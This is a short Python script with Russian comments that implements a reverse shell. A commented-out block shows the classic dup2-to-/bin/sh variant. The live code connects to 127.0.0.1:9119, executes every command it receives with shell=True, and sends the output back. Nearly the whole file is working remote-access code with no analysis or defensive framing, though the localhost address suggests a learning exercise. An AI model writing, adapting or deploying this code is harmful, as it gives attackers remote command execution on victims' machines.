#import socket

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('127.0.0.1', 8888))
#while True:
#    try:
#        msg = input('msg: ').encode()
#    except KeyboardInterrupt:
#        s.close()
#        break
#    else:
#        s.send(msg)
#        print('msg was sent')

#import socket,subprocess, os
#s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("127.0.0.1",9119))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9119))

while True:
    command = s.recv(1024).decode('utf-8')  # получаем команду от сервера
    if command.lower() == 'exit':  # если команда 'exit', выходим из цикла
        break

    # выполняем команду и получаем результат
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout + result.stderr

    # отправляем результат обратно на сервер
    s.send(output)

s.close()

